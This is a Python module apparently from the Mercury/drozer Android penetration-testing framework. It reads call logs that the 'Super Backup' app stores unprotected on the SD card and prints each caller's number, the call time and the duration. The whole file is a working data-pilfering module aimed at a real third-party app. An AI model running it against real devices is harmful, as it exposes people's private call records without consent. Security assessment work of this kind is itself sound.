import re
import time

from xml.etree import ElementTree

from mwr.common import fs
from mwr.droidhg.modules import common, Module

class Calls(Module, common.ClassLoader, common.FileSystem):
    
    name = "Grab call logs exported by Super Backup"
    description = """Grabs call logs backed up to the SD card by 'Super Backup : SMS & Contacts' (com.idea.backup.smscontacts)."""
    examples = ""
    author = "Henry Hoggard"
    date = "2012-12-17"
    license = "MWR Code License"
    path = ["exploit", "pilfer", "thirdparty", "idea", "superbackup"]
    
    __directory = "/mnt/sdcard/SmsContactsBackup/logs"
    
    def execute(self, arguments):
        dumps = self.listFiles(self.__directory)
        
        if dumps != None:
            for dump in dumps:
                data = self.readFile("/".join([self.__directory, str(dump)]))
                
                self.stdout.write("Call Log Backup: %s\n" % str(dump))
                xml = ElementTree.fromstring(data)

                for log in xml.findall('log'):
                    recvd = time.gmtime(float(log.attrib['date']) / 1000)
                    
                    self.stdout.write("  from %s, %4d-%02d-%02d %02d:%02d:%02d%s, duration %ds\n" % (log.attrib['number'], recvd.tm_year, recvd.tm_mon, recvd.tm_mday, recvd.tm_hour, recvd.tm_min, recvd.tm_sec, log.attrib['new'] != '0' and "*" or "", int(log.attrib['dur'])))
                self.stdout.write("\n")
                    